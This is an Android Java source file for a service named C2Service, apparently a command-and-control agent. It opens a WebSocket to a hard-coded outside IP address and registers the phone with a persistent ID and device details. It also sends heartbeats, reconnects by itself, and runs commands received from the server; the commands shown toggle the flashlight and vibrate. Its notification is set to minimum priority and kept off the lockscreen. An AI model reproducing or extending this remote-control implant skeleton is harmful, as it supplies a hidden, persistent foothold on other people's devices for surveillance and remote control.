package com.vypervic.agent;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.google.gson.Gson;
import com.google.gson.JsonObject;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

import java.util.UUID;
import java.util.concurrent.TimeUnit;

public class C2Service extends Service {
    private static final String TAG = "C2Service";
    private static final String SERVER_URL = "ws://16.16.169.210:5000/ws";
    private static final String CHANNEL_ID = "c2_channel";
    private static final int NOTIFY_ID = 1001;
    private static final long HEARTBEAT_INTERVAL = 30000;

    private WebSocket webSocket;
    private Gson gson = new Gson();
    private SharedPreferences prefs;
    private String deviceId;
    private Handler heartbeatHandler;
    private Runnable heartbeatRunnable;
    private OkHttpClient client;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("c2", MODE_PRIVATE);
        deviceId = prefs.getString("device_id", null);
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString();
            prefs.edit().putString("device_id", deviceId).apply();
        }
        startForeground(NOTIFY_ID, createNotification());

        client = new OkHttpClient.Builder()
                .pingInterval(20, TimeUnit.SECONDS)
                .build();

        connect();

        heartbeatHandler = new Handler(Looper.getMainLooper());
        heartbeatRunnable = () -> {
            if (webSocket != null) {
                JsonObject heartbeat = new JsonObject();
                heartbeat.addProperty("type", "heartbeat");
                heartbeat.addProperty("device_id", deviceId);
                heartbeat.addProperty("timestamp", System.currentTimeMillis());
                webSocket.send(heartbeat.toString());
                Log.d(TAG, "Heartbeat sent");
            }
            heartbeatHandler.postDelayed(heartbeatRunnable, HEARTBEAT_INTERVAL);
        };
    }

    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "C2 Agent", NotificationManager.IMPORTANCE_MIN);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("C2 Agent")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
    }

    private void connect() {
        Request request = new Request.Builder().url(SERVER_URL).build();
        client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, okhttp3.Response response) {
                C2Service.this.webSocket = webSocket;
                registerDevice();
                heartbeatHandler.post(heartbeatRunnable);
                Log.i(TAG, "WebSocket connected");
            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                try {
                    JsonObject json = gson.fromJson(text, JsonObject.class);
                    if (json.has("command")) {
                        handleCommand(json);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error parsing message", e);
                }
            }

            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                Log.w(TAG, "WebSocket closed, reconnecting...");
                reconnect();
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, okhttp3.Response response) {
                Log.e(TAG, "WebSocket failure, reconnecting...", t);
                reconnect();
            }
        });
    }

    private void reconnect() {
        heartbeatHandler.removeCallbacks(heartbeatRunnable);
        new Handler(Looper.getMainLooper()).postDelayed(this::connect, 5000);
    }

    private void registerDevice() {
        JsonObject reg = new JsonObject();
        reg.addProperty("type", "register");
        reg.addProperty("device_id", deviceId);
        reg.addProperty("model", Build.MODEL);
        reg.addProperty("manufacturer", Build.MANUFACTURER);
        reg.addProperty("android_version", Build.VERSION.RELEASE);
        reg.addProperty("sdk_version", Build.VERSION.SDK_INT);
        reg.addProperty("battery", getBatteryLevel());
        reg.addProperty("online", true);
        webSocket.send(reg.toString());
        Log.d(TAG, "Device registered: " + deviceId);
    }

    private void handleCommand(JsonObject cmd) {
        String command = cmd.get("command").getAsString();
        Log.d(TAG, "Received command: " + command);

        JsonObject result = new JsonObject();
        result.addProperty("type", "operation_status");
        result.addProperty("device_id", deviceId);
        boolean success = false;
        String message = "";

        switch (command) {
            case "toggle_flashlight":
                success = toggleFlashlight();
                message = success ? "Flashlight toggled" : "Flashlight failed";
                break;
            case "vibrate":
                int duration = cmd.has("duration") ? cmd.get("duration").getAsInt() : 1000;
                success = vibrate(duration);
                message = success ? "Vibrated" : "Vibration failed";
                break;
            default:
                message = "Unknown command: " + command;
        }
        result.addProperty("success", success);
        result.addProperty("message", message);
        webSocket.send(result.toString());
    }

    private boolean toggleFlashlight() {
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Camera permission missing");
            return false;
        }
        CameraManager camManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        if (camManager == null) return false;
        try {
            String cameraId = null;
            for (String id : camManager.getCameraIdList()) {
                CameraCharacteristics chars = camManager.getCameraCharacteristics(id);
                Boolean flashAvailable = chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                Integer lensFacing = chars.get(CameraCharacteristics.LENS_FACING);
                if (flashAvailable != null && flashAvailable && lensFacing != null &&
                        lensFacing == CameraCharacteristics.LENS_FACING_BACK) {
                    cameraId = id;
                    break;
                }
            }
            if (cameraId != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                boolean newState = !prefs.getBoolean("flash_on", false);
                camManager.setTorchMode(cameraId, newState);
                prefs.edit().putBoolean("flash_on", newState).apply();
                Log.d(TAG, "Flashlight toggled to " + newState);
                return true;
            }
        } catch (Exception e) {
            Log.e(TAG, "Flashlight error", e);
        }
        return false;
    }

    private boolean vibrate(int duration) {
        Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        if (vibrator == null || !vibrator.hasVibrator()) return false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE));
        } else {
            vibrator.vibrate(duration);
        }
        return true;
    }

    private int getBatteryLevel() {
        android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
        return bm != null ? bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) : 0;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (webSocket != null) webSocket.close(1000, null);
        heartbeatHandler.removeCallbacks(heartbeatRunnable);
    }
}
